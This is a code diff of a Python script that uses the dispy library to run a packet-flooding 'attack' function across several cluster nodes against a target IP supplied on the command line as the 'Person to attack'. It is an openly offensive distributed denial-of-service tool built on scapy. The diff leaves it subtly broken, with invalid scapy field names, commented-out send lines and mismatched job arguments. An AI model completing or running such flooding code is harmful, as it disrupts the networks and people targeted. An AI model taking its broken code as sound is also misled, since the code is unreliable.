@@ -1,19 +1,20 @@
 
 # 'compute' is distributed to each node running 'dispynode'
-def attack(ip_to_attack, duration):
+def attack(target_IP, duration):
     import time, socket
-    from scapy.all import IP, TCP, send
+    import scapy.all as scapy
+
     start = time.perf_counter()
     
-    i = 1
+    i = 2
 
-    # while time.perf_counter() - start > duration:
-    #     for source_port in range(1, 65535):
-    #         IP1 = IP(source_IP = source_IP, destination = target_IP)
-    #         TCP1 = TCP(srcport = source_port, dstport = 80)
-    #         pkt = IP1 / TCP1
-    #         send(pkt, inter = .001)
-    #         i = i + 1
+    while time.perf_counter() - start < duration:
+        for source_port in range(1, 65535):
+            IP1 = scapy.IP(source_IP = '10.0.0.55', destination = '10.0.0.10')
+        #     TCP1 = TCP(srcport = source_port, dstport = 80)
+        #     pkt = IP1 / TCP1
+        #     send(pkt, inter = .001)
+            i = i + 1
     return i, socket.gethostname()
 
 
@@ -26,7 +27,7 @@ def job_callback(job): # executed at the client
 if __name__ == '__main__':
     import dispy, argparse, logging, socket, sys, os, random, dispy.httpd
 
-    server_nodes = ['10.0.0.21'], '10.0.0.12']#, '10.0.0.20', '10.0.0.21']
+    server_nodes = ['10.0.0.21', '10.0.0.12']#, '10.0.0.20', '10.0.0.21']
 
     parser = argparse.ArgumentParser()
     parser.add_argument("ip_addr_to_attack", type=str, help="IP Address of Person to attack")
@@ -38,22 +39,22 @@ if __name__ == '__main__':
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
-    cluster = dispy.JobCluster(attack, ip_addr=s.getsockname()[0], nodes=server_nodes, callback=job_callback, loglevel=logging.INFO)
+    cluster = dispy.JobCluster('./saphyra.py', ip_addr=s.getsockname()[0], nodes=server_nodes, callback=job_callback, loglevel=logging.INFO)
     # View Job Progress @ https://{master}:8181
     http_server = dispy.httpd.DispyHTTPServer(cluster)
 
     print(('Submitting attack of %s for %i seconds each to %s' % (ip_addr_to_attack, attack_length, server_nodes)))
     jobs = []
-    for i in range(10):
+    for i in range(5):
 
-        job = cluster.submit(ip_addr_to_attack, random.randint(1,5))
+        job = cluster.submit('http://10.0.0.69')
         job.id = i
         jobs.append(job)
 
     cluster.wait()
 
-    for job in jobs:
-        packets_sent, host = job()
-        print('Attack Executed on %s for %s seconds' % (packets_sent, host))
+    # for job in jobs:
+    #     packets_sent, host = job()
+    #     print('%s Attacks Executed on %s by %s' % (packets_sent, ip_addr_to_attack, host))
     cluster.print_status()
     cluster.close()
